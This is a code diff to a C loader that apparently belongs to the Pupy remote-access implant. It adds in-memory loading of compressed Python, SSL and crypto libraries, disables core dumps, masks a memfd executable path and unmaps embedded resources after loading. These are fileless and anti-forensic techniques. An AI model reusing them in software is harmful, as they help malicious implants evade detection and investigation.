@@ -11,22 +11,20 @@
 #include <string.h>
 #include <pthread.h>
 #include <stdint.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
 #include "pupy_load.h"
 #include "Python-dynload.h"
 
 #include "_memimporter.h"
+#include "tmplibrary.h"
 #include "debug.h"
 
-extern const char resources_python27_so_start[];
-extern const int resources_python27_so_size;
-
-extern const char resources_bootloader_pyc_start[];
-extern const int resources_bootloader_pyc_size;
-
-#ifdef _PYZLIB_DYNLOAD
-extern const char resources_zlib_so_start[];
-extern const int resources_zlib_so_size;
-#endif
+#include "resources_bootloader_pyc.c"
+#include "resources_python27_so.c"
+#include "resources_libssl_so.c"
+#include "resources_libcrypto_so.c"
 
 extern DL_EXPORT(void) init_memimporter(void);
 extern DL_EXPORT(void) initpupy(void);
@@ -38,6 +36,31 @@ extern DL_EXPORT(void) initpupy(void);
 	const uint32_t dwPupyArch = 32;
 #endif
 
+#include "lzmaunpack.c"
+
+static inline void* xz_dynload(const char *soname, const char *xzbuf, size_t xzsize) {
+	void *uncompressed = NULL;
+	size_t uncompressed_size = 0;
+
+	uncompressed = lzmaunpack(xzbuf, xzsize, &uncompressed_size);
+
+	if (!uncompressed) {
+		dprint("%s decompression failed\n", soname);
+		abort();
+	}
+
+	void *res = memdlopen(soname, (char *) uncompressed, uncompressed_size);
+
+	free(uncompressed);
+
+	if (!res) {
+		dprint("loading %s from memory failed\n", soname);
+		abort();
+	}
+
+	return res;
+}
+
 uint32_t mainThread(int argc, char *argv[], bool so) {
 
 	int rc = 0;
@@ -48,21 +71,33 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 	uintptr_t cookie = 0;
 	PyGILState_STATE restore_state;
 
-	if(!Py_IsInitialized) {
-		int res=0;
-
-		if(!_load_python(
-				"libpython2.7.so",
-				resources_python27_so_start,
-				resources_python27_so_size)) {
-			dprint("loading libpython2.7.so from memory failed\n");
-			return -1;
-		}
+	struct rlimit lim;
+	if (getrlimit(RLIMIT_NOFILE, &lim) == 0) {
+		lim.rlim_cur = lim.rlim_max;
+		setrlimit(RLIMIT_NOFILE, &lim);
 	}
+
+	lim.rlim_cur = 0; lim.rlim_max = 0;
+	setrlimit(RLIMIT_CORE, &lim);
+
+	xz_dynload("libcrypto.so.1.0.0", resources_libcrypto_so_start, resources_libcrypto_so_size);
+	xz_dynload("libssl.so.1.0.0", resources_libssl_so_start, resources_libssl_so_size);
+
+	if(!Py_IsInitialized) {
+		_load_python(
+			xz_dynload("libpython2.7.so", resources_python27_so_start, resources_python27_so_size)
+		);
+	}
+
+	munmap(resources_libcrypto_so_start, resources_libcrypto_so_size);
+	munmap(resources_libssl_so_start, resources_libssl_so_size);
+	munmap(resources_python27_so_start, resources_python27_so_size);
 
 	dprint("calling PyEval_InitThreads() ...\n");
 	PyEval_InitThreads();
 	dprint("PyEval_InitThreads() called\n");
+
+	char exe[PATH_MAX] = {};
 
 	if(!Py_IsInitialized()) {
 		dprint("Py_IsInitialized\n");
@@ -71,7 +106,14 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 		Py_NoSiteFlag = 1; /* remove site.py auto import */
 
 		dprint("INVOCATION NAME: %s\n", program_invocation_name);
-		Py_SetProgramName(program_invocation_name);
+
+		if (readlink("/proc/self/exe", exe, sizeof(exe)) > 0) {
+			if (strstr(exe, "/memfd:")) {
+				snprintf(exe, sizeof(exe), "/proc/%d/exe", getpid());
+			}
+
+			Py_SetProgramName(exe);
+		}
 
 		dprint("Initializing python.. (%p)\n", Py_Initialize);
 		Py_InitializeEx(0);
@@ -90,11 +132,11 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 			}
 		}
 
-		PySys_SetPath(".");
+		PySys_SetPath("");
 #ifndef DEBUG
 		PySys_SetObject("frozen", PyBool_FromLong(1));
 #endif
-
+		PySys_SetObject("executable", PyString_FromString(exe));
 		dprint("Py_Initialize() complete\n");
 	}
 	restore_state=PyGILState_Ensure();
@@ -104,21 +146,16 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 	initpupy();
 	dprint("initpupy()\n");
 
-#ifdef _PYZLIB_DYNLOAD
-	dprint("load zlib\n");
-    if (!import_module("initzlib", "zlib", resources_zlib_so_start, resources_zlib_so_size)) {
-        dprint("ZLib load failed.\n");
-    }
-#endif
-
 	/* We execute then in the context of '__main__' */
 	dprint("starting evaluating python code ...\n");
 	m = PyImport_AddModule("__main__");
 	if (m) d = PyModule_GetDict(m);
-	if (d) seq = PyMarshal_ReadObjectFromString(
+	if (d) seq = PyObject_lzmaunpack(
 		resources_bootloader_pyc_start,
 		resources_bootloader_pyc_size
 	);
+
+	munmap(resources_bootloader_pyc_start, resources_bootloader_pyc_size);
 
 	if (seq) {
 		Py_ssize_t i, max = PySequence_Length(seq);
